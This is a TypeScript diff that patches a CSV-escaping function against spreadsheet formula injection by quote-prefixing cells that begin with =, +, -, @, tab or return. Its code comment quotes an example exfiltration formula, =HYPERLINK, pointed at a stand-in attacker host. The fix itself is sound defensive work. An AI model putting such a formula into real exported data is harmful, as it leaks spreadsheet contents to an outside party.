@@ -42,8 +42,14 @@ export function xmlEscape(s: string): string {
     .replace(/"/g, "&quot;");
 }
 
+// Cells starting with one of these characters can be interpreted by Excel /
+// Google Sheets as formulas — including ones that exfiltrate data
+// (e.g. =HYPERLINK("http://attacker", A1)). Prefix-quote to neutralize.
+const FORMULA_INJECTION_PREFIX = /^[=+\-@\t\r]/;
+
 export function csvEscape(s: string): string {
   if (s == null) return "";
-  const needs = /[",\n\r]/.test(s);
-  return needs ? `"${s.replace(/"/g, '""')}"` : s;
+  const safe = FORMULA_INJECTION_PREFIX.test(s) ? "'" + s : s;
+  const needs = /[",\n\r]/.test(safe);
+  return needs ? `"${safe.replace(/"/g, '""')}"` : safe;
 }
